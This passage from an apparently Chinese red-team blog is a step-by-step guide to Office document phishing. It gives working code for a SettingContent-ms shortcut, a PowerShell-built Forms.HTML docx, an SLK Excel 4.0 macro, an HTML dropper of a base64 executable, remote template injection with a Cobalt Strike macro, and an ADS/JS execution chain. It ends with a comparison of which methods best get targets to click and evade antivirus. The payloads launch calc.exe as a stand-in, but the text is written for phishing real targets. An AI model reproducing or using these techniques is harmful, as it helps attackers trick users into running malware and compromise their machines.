<p>​        .SettingContent-ms格式是在Windows 10中引入的，用于为各种Windows 10设置页面创建“快捷方式”。实际上，它们就是一些XML文件，用于存放Windows 10设置二进制文件的路径。</p>
<p>​        首先我们创建一个文件，内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;PCSettings&gt;</span><br><span class="line">  &lt;SearchableContent xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;Search&#x2F;2013&#x2F;SettingContent&quot;&gt;</span><br><span class="line">    &lt;ApplicationInformation&gt;</span><br><span class="line">&lt;AppID&gt;windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel&lt;&#x2F;AppID&gt;</span><br><span class="line">      &lt;DeepLink&gt;%windir%\system32\cmd.exe &#x2F;c calc.exe&lt;&#x2F;DeepLink&gt;</span><br><span class="line">&lt;Icon&gt;%windir%\system32\control.exe&lt;&#x2F;Icon&gt;</span><br><span class="line">    &lt;&#x2F;ApplicationInformation&gt;</span><br><span class="line">    &lt;SettingIdentity&gt;</span><br><span class="line">      &lt;PageID&gt;&lt;&#x2F;PageID&gt;</span><br><span class="line">&lt;HostID&gt;&#123;12B1697E-D3A0-4DBC-B568-CCF64A3F934D&#125;&lt;&#x2F;HostID&gt;</span><br><span class="line">    &lt;&#x2F;SettingIdentity&gt;</span><br><span class="line">    &lt;SettingInformation&gt;</span><br><span class="line">&lt;Description&gt;@shell32.dll,-&lt;&#x2F;Description&gt;</span><br><span class="line">      &lt;Keywords&gt;@shell32.dll,-&lt;&#x2F;Keywords&gt;</span><br><span class="line">    &lt;&#x2F;SettingInformation&gt;</span><br><span class="line">  &lt;&#x2F;SearchableContent&gt;</span><br><span class="line">&lt;&#x2F;PCSettings&gt;</span><br></pre></td></tr></table></figure>

<p>​    将该文件保存为test.settingcontent-MS文件并放到如下目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Packages\windows.immersivecontrolpanel_cw5n1h2txyewy\LocalState\Indexed\Settings\zh-CN</span><br></pre></td></tr></table></figure>

<p>​    双击该文件即可触发</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803162800487.png" alt="image-20200803162800487"></p>
<p>​    如果这个文件没有放置在指定的目录，是没有执行权限的。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803162850793.png" alt="image-20200803162850793"></p>
<p>​    我尝试将生成的test.settingcontent-MS文件以OLE形式插入到word文档中，经过测试无论是否关闭defender，双击打开都会被查杀。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803163921360.png" alt="image-20200803163921360"></p>
<p><strong>高版本windows+office是否可以触发？</strong></p>
<p>​    我是用高版本win10+office可以正常触发。</p>
<h4 id="Microsoft-Forms-2-0-HTML控件"><a href="#Microsoft-Forms-2-0-HTML控件" class="headerlink" title="Microsoft Forms 2.0 HTML控件"></a><strong>Microsoft Forms 2.0 HTML控件</strong></h4><p>​    Microsoft Forms 2.0对象库提供了许多可以在Office文档中使用的“HTML”ActiveX控件。这些控件标记为对初始化是安全的，并且不要求用户为嵌入它们的文档启用ActiveX。</p>
<p>​    首先使用如下ps代码，生成恶意的docx文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># target file path</span><br><span class="line">$filename &#x3D; [Environment]::GetFolderPath(&#39;Desktop&#39;) + &#39;\Forms.HTML.docx&#39;</span><br><span class="line">$progid &#x3D; &#39;Forms.HTML:Image.1&#39;</span><br><span class="line">$clsid &#x3D; &#39;5512D112-5CC6-11CF-8D67-00AA00BDCE1D&#39;</span><br><span class="line">$html &#x3D; &#39;&lt;x type&#x3D;&quot;image&quot; src&#x3D;&quot;https:&#x2F;&#x2F;securify.nl&#x2F;blog&#x2F;SFY20180801&#x2F;packager.emf&quot; action&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;c|&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;&gt;&#39;</span><br><span class="line"></span><br><span class="line"># load assemblies for changing the docx (zip) file</span><br><span class="line">[void] [Reflection.Assembly]::LoadWithPartialName(&#39;System.IO.Compression.FileSystem&#39;)</span><br><span class="line">[void] [Reflection.Assembly]::LoadWithPartialName(&#39;System.IO.Compression&#39;)</span><br><span class="line"></span><br><span class="line"># create new Word document</span><br><span class="line">$word &#x3D; New-Object -ComObject Word.Application</span><br><span class="line">$word.Visible &#x3D; $false</span><br><span class="line">$doc &#x3D; $word.documents.add()</span><br><span class="line"></span><br><span class="line">$shape &#x3D; $doc.InlineShapes.AddOLEControl($progid)</span><br><span class="line"></span><br><span class="line"># save doc &amp; close Word</span><br><span class="line">$doc.SaveAs($filename)</span><br><span class="line">$doc.Close($false)</span><br><span class="line">$word.Quit()</span><br><span class="line"></span><br><span class="line"># create temp folder for modifying the docx</span><br><span class="line">$tmpfolder &#x3D; &quot;$env:TEMP\&quot; + [System.Guid]::NewGuid()</span><br><span class="line">$null &#x3D; New-Item -Type directory -Path $tmpfolder</span><br><span class="line"></span><br><span class="line"># unzip and replace ActiveX object</span><br><span class="line">[System.IO.Compression.ZipFile]::ExtractToDirectory($filename, $tmpfolder)</span><br><span class="line">Remove-Item &quot;$tmpfolder\word\activeX\activeX1.bin&quot;</span><br><span class="line"></span><br><span class="line">$clsid &#x3D; ([GUID]$clsid).ToByteArray()</span><br><span class="line">$clsid | Set-Content &quot;$tmpfolder\word\activeX\activeX1.bin&quot; -Encoding Byte</span><br><span class="line">$html | Add-Content &quot;$tmpfolder\word\activeX\activeX1.bin&quot; -Encoding Unicode</span><br><span class="line"></span><br><span class="line"># rezip</span><br><span class="line">Remove-Item $filename</span><br><span class="line">[System.IO.Compression.ZipFile]::CreateFromDirectory($tmpfolder, $filename)</span><br><span class="line"></span><br><span class="line"># cleanup</span><br><span class="line">Remove-Item $tmpfolder -Force -Recurse</span><br></pre></td></tr></table></figure>

<p>​    当点击插入的文件，只会弹出一个框，用户点击一次后即可实现命令执行</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803165712953.png" alt="image-20200803165712953"></p>
<p>​    除了加载本地文件，也可以通过修改action里的内容加载远程的exe文件上线，这个操作会打开浏览器进行文件下载，因此不是很适合加载exe</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803170442684.png" alt="image-20200803170442684"></p>
<p>​    当我们插入的是远程的hta则只会弹出一个框，当目标点击后即可上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803170650414.png" alt="image-20200803170650414"></p>
<p>​    但是在装有chrome的电脑中，点击确定后还是会使用chrome进行下载而不是直接执行。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803170934107.png" alt="image-20200803170934107"></p>
<h3 id="SLK-Excel钓鱼"><a href="#SLK-Excel钓鱼" class="headerlink" title="SLK Excel钓鱼"></a>SLK Excel钓鱼</h3><p><strong>什么是SLK Excel？</strong></p>
<p>​    SLK文件是一种以Microsoft创建的符号链接（SYLK）格式保存的文件，用于在电子表格程序和其他数据库之间传输数据。 它包含由分号分隔的文本行，用于指定单元格的行，列，格式和内容。 </p>
<p><strong>如何使用SLK 进行命令执行？</strong></p>
<p>​    将如下代码写入test.slk文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID;P</span><br><span class="line">O;E</span><br><span class="line">NN;NAuto_open;ER101C1;KOut Flank;F</span><br><span class="line">C;X1;Y101;K0;EEXEC(&quot;calc.exe&quot;)</span><br><span class="line">C;X1;Y102;K0;EHALT()</span><br><span class="line">E</span><br></pre></td></tr></table></figure>

<p>​    打开该文件并且选择开启宏即可实现命令执行</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803172930136.png" alt="image-20200803172930136"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803172943024.png" alt="image-20200803172943024"></p>
<p>​    slk文件也可以保存成cvs，不过保存为cvs打开后首先会弹出一个框让目标确定，当目标确认后才能打开文件</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803173115546.png" alt="image-20200803173115546"></p>
<h3 id="嵌入视频钓鱼（失败）"><a href="#嵌入视频钓鱼（失败）" class="headerlink" title="嵌入视频钓鱼（失败）"></a>嵌入视频钓鱼（失败）</h3><p>​    首先创建一个docx文件，选择 插入-&gt;联机视频</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803175822004.png" alt="image-20200803175822004"></p>
<p>​    在弹出的框中选择任意一个视频,我在网上随便找了个视频</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;img.ksbbs.com&#x2F;asset&#x2F;Mon_1703&#x2F;05cacb4e02f9d9e.mp4</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803175907217.png" alt="image-20200803175907217"></p>
<p>​    插入后保存，将这个docx文件重命名为zip，找到word目录下的document.xml文件，将这个文件单独解压出来</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803180057546.png" alt="image-20200803180057546"></p>
<p>​    打开这个文件，找到embeddedHtml属性，这个属性中是可以嵌入html代码的</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803181701717.png" alt="image-20200803181701717"></p>
<p><strong>如何通过html执行我们的恶意文件？</strong></p>
<p>这里我以calc.exe为例，首先使用命令行将calc.exe打包为base64</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803182326331.png" alt="image-20200803182326331"></p>
<p>​    将calc.txt中的换行去掉，放到如下代码模板中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            function base64ToArrayBuffer(base64) &#123;</span><br><span class="line">            var binary_string &#x3D; window.atob(base64);</span><br><span class="line">            var len &#x3D; binary_string.length;</span><br><span class="line">            </span><br><span class="line">            var bytes &#x3D; new Uint8Array( len );</span><br><span class="line">                for (var i &#x3D; 0; i &lt; len; i++) &#123; bytes[i] &#x3D; binary_string.charCodeAt(i); &#125;</span><br><span class="line">                return bytes.buffer;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 32bit simple reverse shell</span><br><span class="line">            var file &#x3D; &#39;base64代码&#39;;</span><br><span class="line">            var data &#x3D; base64ToArrayBuffer(file);</span><br><span class="line">            var blob &#x3D; new Blob([data], &#123;type: &#39;octet&#x2F;stream&#39;&#125;);</span><br><span class="line">            var fileName &#x3D; &#39;evil.exe&#39;;</span><br><span class="line"></span><br><span class="line">            if (window.navigator.msSaveOrOpenBlob) &#123;</span><br><span class="line">                window.navigator.msSaveOrOpenBlob(blob,fileName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                var a &#x3D; document.createElement(&#39;a&#39;);</span><br><span class="line">                console.log(a);</span><br><span class="line">                document.body.appendChild(a);</span><br><span class="line">                a.style &#x3D; &#39;display: none&#39;;</span><br><span class="line">                var url &#x3D; window.URL.createObjectURL(blob);</span><br><span class="line">                a.href &#x3D; url;</span><br><span class="line">                a.download &#x3D; fileName;</span><br><span class="line">                a.click();</span><br><span class="line">                window.URL.revokeObjectURL(url);</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>​    将file变量中的内容进行替换，将这个文件保存为html文件，当目标点击了这个html文件，会弹出是否运行的按钮，点击运行后即可执行文件。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803182757726.png" alt="image-20200803182757726"></p>
<p>​    然后我们只需要将这个文件的内容插入到embeddedHtml的内容中就可以了，需要注意的是html中的特殊字符需要进行实体编码才可以。可以使用<a href="https://mothereff.in/html-entities" target="_blank" rel="noopener">这个</a>进行html编码,将编码后的内容替换，再将document.xml压缩到zip包中，再将zip改名为docx，打开docx并且双击播放视频，即可下载文件，不过这个我<strong>复现失败</strong>了。</p>
<h3 id="远程模板注入宏钓鱼"><a href="#远程模板注入宏钓鱼" class="headerlink" title="远程模板注入宏钓鱼"></a>远程模板注入宏钓鱼</h3><p><strong>为什么要使用远程模板注入宏？</strong></p>
<p>​    有些杀软在检测到docm文件会进行查杀，但是不会docx文件，因为docx中不能去执行宏</p>
<p><strong>如何使用远程模板注入宏？</strong></p>
<p>​    首先使用CS生成宏</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804093334303.png" alt="image-20200804093334303"></p>
<p>​    创建一个docx文件，在视图中找到宏，创建一个宏，将CS生成的内容放进去</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804093542904.png" alt="image-20200804093542904"></p>
<p>​    编写完成后将文件另存为dotm格式。</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803204248936.png" alt="image-20200803204248936"></p>
<p>​    选择任意一个模板创建docx文件</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803204513685.png" alt="image-20200803204513685"></p>
<p>​    将创建的docx文件重命名为zip格式，将word\_rels\settings.xml.rels解压出来，留意target后面的内容</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200803204930541.png" alt="image-20200803204930541"></p>
<p>​    可以将这个地址改为创建的dotm文件的路径web路径，将settings.xml.rels重新保存到zip文件中，并将zip重命名为docx,打开后点击确定和启用即可上线</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804093807513.png" alt="image-20200804093807513"></p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804093844411.png" alt="image-20200804093844411"></p>
<h3 id="使用ADS和JS钓鱼"><a href="#使用ADS和JS钓鱼" class="headerlink" title="使用ADS和JS钓鱼"></a>使用ADS和JS钓鱼</h3><p><strong>什么是ADS?</strong></p>
<pre><code>可以理解为windows的文件特性，这个要描述的话比较复杂，我找了一篇文章[这里](https://www.freebuf.com/articles/73270.html)</code></pre><p><strong>如何使用ADS?</strong></p>
<p>​    我们生成一个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Hello world &gt; test.txt:test666</span><br></pre></td></tr></table></figure>

<p>​    此时如果我们直接用dir查看仅仅能看到内容为空的test.txt</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804100053022.png" alt="image-20200804100053022"></p>
<p>​    当用dir /r查看，才可以看到隐藏的test.txt:test666文件</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804100204159.png" alt="image-20200804100204159"></p>
<p>​    也可以通过powershell查看隐藏的文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content test.txt -stream  test666</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804101004021.png" alt="image-20200804101004021"></p>
<p><strong>使用ADS和JS钓鱼利用过程</strong></p>
<p>​    首先将calc.exe写入文件流</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type calc.exe &gt; test.txt:calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804101917132.png" alt="image-20200804101917132"></p>
<p>​    使用mklink创建链接,需要使用高权限才能创建。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink C:\Users\jerry\Desktop\test888.txt C:\Users\jerry\Desktop\test.txt:calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804102157127.png" alt="image-20200804102157127"></p>
<p>​    再创建一个read.txt文件内容随便写，创建一个js文件，内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var objShell &#x3D; new ActiveXObject(&quot;shell.application&quot;);</span><br><span class="line">objShell.ShellExecute(&quot;cmd.exe&quot;, &quot;&#x2F;c test888.txt&quot;, &quot;&quot;, &quot;open&quot;, 0);</span><br><span class="line">objShell.ShellExecute(&quot;read.txt&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 1);</span><br></pre></td></tr></table></figure>

<p>​    双击这个js文件即可执行命令，并且打开文件</p>
<p><img src="/2020/07/29/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200804104012530.png" alt="image-20200804104012530"></p>
<p>​    这里确实实现了执行我们exe的功能，但是如果要把这个文件发送给目标，具体该怎么发送才能让目标点击js执行命令呢，就是如何把ADS文件打包起来发送给目标呢？从这个制作过程来看我认为这种方式用来做权限维持还行，但是不能用来发送给别人钓鱼。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    关于文档钓鱼获取权限的部分就总结这么多，这是我们在没有利用各种漏洞的情况下的一些方法。下次再看下关于利用office漏洞进行钓鱼的利用方法。最后我们总结分析一下这些方法，因为我们在真正要去钓鱼的话只是选择一个通用性更高的方式和利用更简单的方式就可以了。</p>
<p>​    <strong>DDE钓鱼</strong></p>
<p>​        缺点：需要用户点击两次，存在office或者windows的版本限制</p>
<p>​        优点：不用开启宏，可以以docx的文件格式发送</p>
<p>​    <strong>CHM钓鱼</strong></p>
<p>​        缺点：通过CHM调用cmd，powershell等敏感进程会被360查杀</p>
<p>​        优点：无利用条件限制，只要目标点击制作好的CHM文件即可</p>
<p>​    <strong>OLE钓鱼</strong></p>
<p>​        缺点：需要用户点击插入的文件并且点击一次确定，高版本的windows+office无法利用</p>
<p>​        优点：不用开启宏</p>
<p>​    <strong>LNK钓鱼</strong></p>
<p>​        缺点：调用敏感进程会被360拦截</p>
<p>​        优点：无利用限制，不太容易构造理由让目标点击</p>
<p>​    <strong>IQY钓鱼</strong></p>
<p>​        缺点：需要用户开启禁用内容并且点击两次确定，存在版本限制，高版本windows+office无法执行</p>
<p>​        优点：不用开启宏</p>
<p>​    <strong>office宏钓鱼</strong></p>
<p>​        缺点：需要目标手动点击开启宏，需要保存为docm或者低版本的doc</p>
<p>​        优点：没有版本利用限制，只需要目标点击一次，</p>
<p>​    <strong>PPT动作按钮钓鱼</strong></p>
<p>​        缺点：需要用户播放PPT，并且鼠标移动到指定区域，点击确定才能触发。</p>
<p>​        优点：不用执行其他的特殊操作，只要发送一个正常的ppt就好了</p>
<p>​    <strong>RTLO钓鱼</strong></p>
<p>​        缺点：defender,360等软件检测到这种命名会直接查杀</p>
<p>​        优点：将我们的可执行文件后缀伪造为其他后缀</p>
<p>​    <strong>Excel 4.0宏钓鱼</strong></p>
<p>​        缺点：保存为xlsm格式，需要目标点击开启宏</p>
<p>​        优点：只需要用户点击一次</p>
<p>​    <strong>office嵌入对象钓鱼</strong></p>
<p>​        缺点：适用于只装了ie的用户</p>
<p>​        优点：只需要用户点击执行，不需要开启宏</p>
<p>​    <strong>SLK Excel钓鱼</strong></p>
<p>​        缺点：需要开启宏，后缀为slk</p>
<p>​        优点：后缀不是xlsm</p>
<p>​    <strong>远程模板注入宏钓鱼</strong></p>
<p>​        缺点：需要开启宏</p>
<p>​        优点:   文件后缀为docx，比较正常</p>
<p>​    经过以上的对比，我的分析如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不以office钓鱼</span><br><span class="line">	CHM和LNK都可以适用，只要绕过敏感进程的保护就可以了</span><br><span class="line">以office进行钓鱼</span><br><span class="line">	DDE、IQY、OLE虽然都不用开启宏，但是有版本限制</span><br><span class="line">	office嵌入对象钓鱼 需要用户点击某个文件，并且电脑只安装ie</span><br><span class="line">	ppt动作按钮触发，需要用户执行某个特定的交互</span><br><span class="line">	远程模板注入宏钓鱼 office宏钓鱼 SLK Excel钓鱼 Excel 4.0宏钓鱼 启用宏即可</span><br></pre></td></tr></table></figure>

<p><strong>参考文章</strong></p>
<p><a href="https://evi1cg.me/archives/chm_backdoor.html" target="_blank" rel="noopener">高级组合技打造“完美” 捆绑后门</a></p>
<p><a href="https://www.cnblogs.com/-qing-/p/10900454.html" target="_blank" rel="noopener">Cobalt Strike之CHM、LNK、HTA钓鱼</a></p>
<p><a href="https://evi1cg.me/archives/Office_Phishing.html" target="_blank" rel="noopener">Office Phishing</a></p>
<p><a href="https://www.anquanke.com/post/id/85248" target="_blank" rel="noopener">快捷方式：一种钓鱼攻击的新姿势</a></p>
<p><a href="https://payloads.online/archivers/2019-05-16/1" target="_blank" rel="noopener">office宏</a></p>
<p><a href="https://evi1cg.me/archives/Create_PPSX.html" target="_blank" rel="noopener">构造PPSX钓鱼文件</a></p>
<p><a href="http://www.admintony.com/Excel-4-0-macros.html" target="_blank" rel="noopener">利用Excel 4.0宏执行任意命令</a></p>
<p><a href="https://www.securify.nl/blog/SFY20180801/click-me-if-you-can_-office-social-engineering-with-embedded-objects.html" target="_blank" rel="noopener">CLICK ME IF YOU CAN, OFFICE SOCIAL ENGINEERING WITH EMBEDDED OBJECTS</a></p>
<p><a href="https://www.ired.team/" target="_blank" rel="noopener">Red Teaming Experiments</a></p>
<p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/Office-deVBA-hong-gong-ji-hai-you-yuan-cheng-mo-ba.html" target="_blank" rel="noopener">Office的VBA宏攻击(还有远程模板注入)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/" class="post-title-link" itemprop="url">MSSQL注入绕过360主机卫士</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-26 15:35:22" itemprop="dateCreated datePublished" datetime="2020-07-26T15:35:22+08:00">2020-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-28 18:39:21" itemprop="dateModified" datetime="2020-07-28T18:39:21+08:00">2020-07-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仅仅是记录绕过的思路和过程，也算是自己的一个总结</span><br></pre></td></tr></table></figure>

